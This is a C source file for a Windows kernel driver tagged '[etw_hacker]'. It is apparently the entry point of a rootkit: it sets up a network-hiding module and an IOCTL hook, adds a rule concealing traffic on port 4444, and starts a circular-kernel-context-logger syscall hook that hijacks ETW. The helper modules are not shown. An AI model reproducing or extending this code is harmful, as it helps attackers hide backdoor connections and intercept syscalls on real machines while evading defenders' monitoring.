#include "etw.h"
#include "net_hide.h"
#include "hook_ioctl.h"
#include "filter.h"
#include "offsets.h"

extern PVOID cpu_clock;
extern PVOID cpu_lock_orig;

static BOOLEAN g_NetHideInitialized = FALSE;
static BOOLEAN g_IoctlHookInit = FALSE;

VOID DriverUnload(PDRIVER_OBJECT driver)
{
	UNREFERENCED_PARAMETER(driver);

	if (g_NetHideInitialized)
	{
		NetHideCleanup();
		g_NetHideInitialized = FALSE;
	}

	if (g_IoctlHookInit)
	{
		IoctlHookCleanup();
		g_IoctlHookInit = FALSE;
	}

	if (cpu_clock && cpu_lock_orig)
		InterlockedExchange64(cpu_clock, cpu_lock_orig);

	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[etw_hacker] unload\n");
}

NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)
{
	NTSTATUS status;
	UNREFERENCED_PARAMETER(reg_path);

	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[etw_hacker] load\n");
	driver->DriverUnload = DriverUnload;

	// 初始化动态偏移
	status = InitializeDynamicOffsets();
	if (!NT_SUCCESS(status))
	{
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[etw_hacker] offset init failed\n");
		return status;
	}

	// init network hide
	status = NetHideInitialize();
	if (NT_SUCCESS(status))
		g_NetHideInitialized = TRUE;

	status = IoctlHookInitialize();
	if (NT_SUCCESS(status))
		g_IoctlHookInit = TRUE;

	// hide rules config
	AddHideRule(0, 0, 0, HTONS(4444));
	// AddHideRule(0, 0, 0, HTONS(5555));
	// AddHideRule(0, 0, MAKE_IP(192, 168, 1, 100), 0);
	// AddHideRule(0, HTONS(8080), 0, 0);

	// ckcl syscall hook
	Initialize(circular_kernel_context_logger);

	return STATUS_SUCCESS;
}
